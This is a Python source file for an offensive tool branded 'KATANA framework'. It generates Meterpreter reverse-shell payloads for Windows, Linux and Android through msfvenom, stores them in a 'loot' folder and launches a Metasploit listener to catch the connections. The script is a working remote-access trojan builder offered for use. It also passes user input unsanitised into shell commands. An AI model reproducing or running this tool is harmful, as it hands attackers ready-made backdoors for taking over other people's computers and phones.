import sys
import termios
import tty

Black = '\033[1;30m'        # Black
Red = '\033[1;31m'          # Red
Green = '\033[1;32m'        # Green
Yellow = '\033[1;33m'       # Yellow
Blue = '\033[1;34m'         # Blue
Purple = '\033[1;35m'       # Purple
Cyan = '\033[1;36m'         # Cyan
White = '\033[1;37m'        # White
NC = '\033[0m'
blue = '\033[0;34m'
white = '\033[0;37m'
lred = '\033[0;31m'

import os
import subprocess
from time import sleep

root = subprocess.getoutput('id -u')
folder = ""

def logo():
    print(r'''
             ____  __.  _____________________    _______      _____   
            |    |/ _| /  _  \__    ___/  _  \   \      \    /  _  \  
            |      <  /  /_\  \|    | /  /_\  \  /   |   \  /  /_\  \ 
            |    |  \/    |    \    |/    |    \/    |    \/    |    \
            |____|__ \____|__  /____|\____|__  /\____|__  /\____|__  /
                    \/       \/              \/         \/         \/ 
                             + KAT@NA FRAMEWORK +                                       
    ''')
def savePath():
    global folder  # Добавляем ключевое слово global

    subprocess.call('clear')
    logo()
    path = '../loot'

    if os.path.exists(path):
        folder = path
        payload_selection()
    else:
        print("[!] Invalid directory path. Please enter a valid path.")
        sleep(1)
        savePath()


def payload_selection():
    subprocess.call('clear')
    logo()
    print("\n")
    print(f"{Blue}+-------------------------------------------------------+")
    print(f"+\t{Green}          Available Payloads   {Blue}                 +")
    print(f"{Blue}+-------------------------------------------------------+{NC}")
    print(f"{Blue}+ {White}[0] {Purple}Exit{Yellow}      {Blue}                                     +")
    print(f"{Blue}+ {White}[1] {Purple}Windows{Yellow}      {Blue}                                     +")
    print(f"+ {White}[2] {Purple}Linux{Yellow}        {Blue}                                     +")
    print(f"+ {White}[3] {Purple}Android{Yellow}        {Blue}                                   +")
    print(f"{Blue}+-------------------------------------------------------+")
    sleep(0.3)
    print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
    payloadType = getch()
    while payloadType not in ['1', '2', '3', '0']:
        print(f"{Red}[-] You enter not work option!{NC}")
        print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
        payloadType = getch()
    else:
        if payloadType == '1':
            windows()
        elif payloadType == '0':
            sys.exit(0)
        elif payloadType == '2':
            linux()
        else:
            android()


def getch():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch


def start_listener(ip, port, payload_type):
    subprocess.call('clear')
    logo()
    print("\n")
    print(Blue + "[#] Start listener metasploit? y/n: " + White, end='', flush=True)
    listener = getch()
    if listener.lower() == 'y':
        print(f"{Green}[+] Starting listener...{NC}")
        os.system(f'msfconsole -q -x "use exploit/multi/handler;set payload {payload_type};set LHOST {ip};set LPORT {port};exploit"')
    elif listener.lower() == 'n':
        print(f"{Green}[+] OK {NC}")
    else:
        print(f"{Green}[+] NO CORRECTLY ENTER! {NC}")


def windows():
    subprocess.call('clear')
    logo()
    print("\n")
    sleep(0.3)
    print(f"{Blue}+-------------------------------------------------------+")
    print(f"+\t{Green}Available Payloads for {Yellow}[{Purple}Windows{Yellow}]   {Blue}             +")
    print(f"{Blue}+-------------------------------------------------------+{NC}")
    sleep(0.3)
    print(f"{Blue}+ {White}[1] {Purple}windows/meterpreter/reverse_tcp           {Blue}        +")
    print(f"+ {White}[2] {Purple}windows/meterpreter/reverse_http         {Blue}         +")
    print(f"+ {White}[3] {Purple}windows/meterpreter/reverse_tcp_dns         {Blue}      +")
    print(f"+ {White}[4] {Purple}windows/meterpreter/reverse_https         {Blue}        +")
    print(f"+ {White}[5] {Purple}windows/meterpreter/reverse_tcp_uuid        {Blue}      +")
    print(f"+ {White}[6] {Purple}windows/meterpreter/reverse_winhttp          {Blue}     +")
    print(f"+ {White}[7] {Purple}windows/meterpreter/reverse_winhttps        {Blue}      +")
    print(f"{Blue}+-------------------------------------------------------+")
    sleep(0.3)
    print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
    payloadWindow = getch()
    while payloadWindow not in ['1', '2', '3', '4', '5', '6', '7']:
        print(f"{Red}[-] You enter not work option!{NC}")
        print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
        payloadWindow = getch()
    else:
        if payloadWindow == '1':
            payload = 'windows/meterpreter/reverse_tcp'
        elif payloadWindow == '2':
            payload = 'windows/meterpreter/reverse_http'
        elif payloadWindow == '3':
            payload = 'windows/meterpreter/reverse_tcp_dns'
        elif payloadWindow == '4':
            payload = 'windows/meterpreter/reverse_https'
        elif payloadWindow == '5':
            payload = 'windows/meterpreter/reverse_tcp_uuid'
        elif payloadWindow == '6':
            payload = 'windows/meterpreter/reverse_winhttp'
        else:
            payload = 'windows/meterpreter/reverse_winhttps'

        subprocess.call('clear')
        logo()
        ip = input(Blue + "[#] Enter your IP address: " + White)
        port = input(Blue + "[#] Enter a port number: " + White)
        file = input(Blue + "[#] Enter the file name: " + White)

        subprocess.call(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f exe > {folder}/{file}.exe", shell=True)
        subprocess.call('clear')
        logo()
        try:
            print(f"{Green}[+] Payload generated successfully!{NC}")
            print(f"{Green}[+] Payload saved as {folder}/{file}.exe{NC}")
            input(f"{Green}[#] Enter to continue ")
            start_listener(ip, port, payload)
        except:
            print(f"{Red}[-] Error!{NC}")


def linux():
    subprocess.call('clear')
    logo()
    print("\n")
    sleep(0.3)
    print(f"{Blue}+-------------------------------------------------------+")
    print(f"+\t{Green}Available Payloads for {Yellow}[{Purple}Linux{Yellow}]   {Blue}             +")
    print(f"{Blue}+-------------------------------------------------------+{NC}")
    sleep(0.3)
    print(f"{Blue}+ {White}[1] {Purple}linux/x86/meterpreter/reverse_tcp           {Blue}        +")
    print(f"+ {White}[2] {Purple}linux/x86/meterpreter/reverse_http         {Blue}         +")
    print(f"+ {White}[3] {Purple}linux/x86/meterpreter/reverse_https         {Blue}        +")
    print(f"{Blue}+-------------------------------------------------------+")
    sleep(0.3)
    print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
    payloadLinux = getch()
    while payloadLinux not in ['1', '2', '3']:
        print(f"{Red}[-] You enter not work option!{NC}")
        print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
        payloadLinux = getch()
    else:
        if payloadLinux == '1':
            payload = 'linux/x86/meterpreter/reverse_tcp'
        elif payloadLinux == '2':
            payload = 'linux/x86/meterpreter/reverse_http'
        else:
            payload = 'linux/x86/meterpreter/reverse_https'


        subprocess.call('clear')
        logo()
        ip = input(Blue + "[#] Enter your IP address: " + White)
        port = input(Blue + "[#] Enter a port number: " + White)
        file = input(Blue + "[#] Enter the file name: " + White)

        subprocess.call(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f elf > {folder}/{file}.elf", shell=True)
        subprocess.call('clear')
        logo()
        try:
            print(f"{Green}[+] Payload generated successfully!{NC}")
            print(f"{Green}[+] Payload saved as {folder}/{file}.elf{NC}")
            input(f"{Green}[#] Enter to continue ")
            start_listener(ip, port, payload)
        except:
            print(f"{Red}[-] Error!{NC}")


def android():
    os.system('clear')
    logo()
    print("\n")
    sleep(0.3)
    print(f"{Blue}+-------------------------------------------------------+")
    print(f"+\t{Green}Available Payloads for {Yellow}[{Purple}Android{Yellow}]   {Blue}           +")
    print(f"{Blue}+-------------------------------------------------------+{NC}")
    sleep(0.3)
    print(f"{Blue}+ {White}[1] {Purple}android/meterpreter/reverse_tcp           {Blue}        +")
    print(f"+ {White}[2] {Purple}android/meterpreter/reverse_http         {Blue}         +")
    print(f"+ {White}[3] {Purple}android/meterpreter/reverse_https         {Blue}        +")
    print(f"{Blue}+-------------------------------------------------------+")
    sleep(0.3)
    print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
    payloadAndroid = getch()
    while payloadAndroid not in ['1', '2', '3']:
        print(f"{Red}[-] You enter not work option!{NC}")
        print(Blue + "[#] Select Payload Type: " + White, end='', flush=True)
        payloadAndroid = getch()
    else:
        if payloadAndroid == '1':
            payload = 'android/meterpreter/reverse_tcp'
        elif payloadAndroid == '2':
            payload = 'android/meterpreter/reverse_http'
        else:
            payload = 'android/meterpreter/reverse_https'


        os.system('clear')
        logo()
        ip = input(Blue + "[#] Enter your IP address: " + White)
        port = input(Blue + "[#] Enter a port number: " + White)
        file = input(Blue + "[#] Enter the file name: " + White)

        subprocess.call(f"msfvenom -p {payload} LHOST={ip} LPORT={port} R > {folder}/{file}.apk", shell=True)
        subprocess.call('clear')
        logo()
        try:
            print(f"{Green}[+] Payload generated successfully!{NC}")
            print(f"{Green}[+] Payload saved as {folder}/{file}.apk{NC}")
            input(f"{Green}[#] Enter to continue ")
            start_listener(ip, port, payload)
        except:
            print(f"{Red}[-] Error!{NC}")
if __name__ == '__main__':
    savePath()